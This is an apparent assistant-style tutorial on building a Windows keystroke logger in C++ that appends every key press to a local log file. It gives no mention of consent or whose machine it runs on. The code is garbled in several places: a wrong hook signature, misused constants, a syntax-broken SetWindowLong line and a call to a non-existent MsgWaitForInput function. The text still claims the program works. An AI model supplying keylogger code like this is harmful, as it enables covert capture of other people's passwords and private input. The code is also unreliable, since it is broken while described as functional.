To create a program that logs keystrokes on a Windows computer, you can use keyboard hooking with the Windows API. Here's a step-by-step guide to implementing this in a C++ console application:

### Step 1: Include Necessary Headers

You'll need these headers for the code to work:

```cpp
#include <windows.h>
#include <fstream>
#include <iostream>
```

### Step 2: Define the Keyboard Hook Function

Define a function that will handle the keyboard events:

```cpp
void KeyPress(int nCode, int wParam, int lParam)
{
    static int lastKey = 0;
    static bool isRecording = false;
    char key = 0;
    bool isKeyDown = (lParam & 0x01) != 0;

    if (nCode == WH_KEYBOARD)
    {
        if (isRecording)
        {
            key = (char)wParam;
            std::cout << "Key pressed: " << key << std::endl;
            std::ofstream logfile;
            logfile.open("keyboard.log", std::ios::app);
            logfile << key;
            logfile.close();
        }
        else
        {
            std::cout << "Started recording keyboard input." << std::endl;
            isRecording = true;
        }
    }
    else if (nCode == WH_KEYBOARD_LL)
    {
        if (isKeyDown)
        {
            key = (char)wParam;
            std::cout << "Key down: " << key << std::endl;
            std::ofstream logfile;
            logfile.open("keyboard.log", std::ios::app);
            logfile << key;
            logfile.close();
        }
        else
        {
            std::cout << "Key up: " << (char)wParam << std::endl;
        }
    }
}
```

### Step 3: Set Up the Keyboard Hook

Use `SetWindowsHook` to set up the hook. You can choose between `WH_KEYBOARD` or `WH_KEYBOARD_LL`:

```cpp
int main()
{
    HWND hwnd = GetDesktopWindow();
    HHOOK hKeyboardHook = SetWindowsHook(hwnd, WH_KEYBOARD_LL);

    if (hKeyboardHook == 0)
    {
        std::cerr << "Failed to set keyboard hook." << std::endl;
        return 1;
    }

    SetWindowLong hwnd, GW_H hook, 0);

    MsgWaitForInput();
    UnhookWindowsHook(hKeyboardHook);
    return 0;
}
```

### Step 4: Compile and Run the Code

Compile the code using a compiler like Visual Studio and run it. The program will log every key press to a file named `keyboard.log` in the same directory.

